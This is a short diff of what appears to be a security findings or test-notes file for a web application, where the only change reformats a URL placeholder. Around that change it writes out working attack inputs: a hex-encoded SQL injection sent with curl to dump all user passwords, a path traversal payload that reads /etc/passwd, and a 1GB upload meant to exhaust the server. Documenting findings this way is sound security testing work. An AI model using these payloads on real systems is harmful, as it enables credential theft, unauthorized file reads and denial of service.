@@ -21,21 +21,21 @@ Running the program:
 
 Setting up the database
 - Adding a user with hexmail = "1", hexpass = "2":
-- enter "<url>/init_client/31/32"
+- enter "< url >/init_client/31/32"
 - Confirm user added:
-- enter "<url>/confirm-client/31/32/<token>" (the token is from the program running sudo)
+- enter "< url >/confirm-client/31/32/<token>" (the token is from the program running sudo)
 - Adding a rule
-- enter "<url>/post-rule/init/admin/1"
+- enter "< url >/post-rule/init/admin/1"
 
 # Finding 1: Inject SQL to extract all user credentials
 - Expected result: List of all users and passwords
 - payload=$(echo "' UNION SELECT user, password FROM user_pw_table;--" | xxd -p)
-- curl -k "<url>/init_client/${payload}/31"
+- curl -k "< url >/init_client/${payload}/31"
 
 # Finding 2: Inject '../' into the file path parameter to read unauthorized files
 - Expected result: Contents of /etc/passwd
 - payload=$(echo "../../etc/passwd" | xxd -p)
-- enter "<url>/get_rule/${payload}"
+- enter "< url >/get_rule/${payload}"
 
 # Finding 3: Generate a large file (1GB) and upload it
 - Expected result: Server becomes unresponsive or logs indicate resource exhaustion.
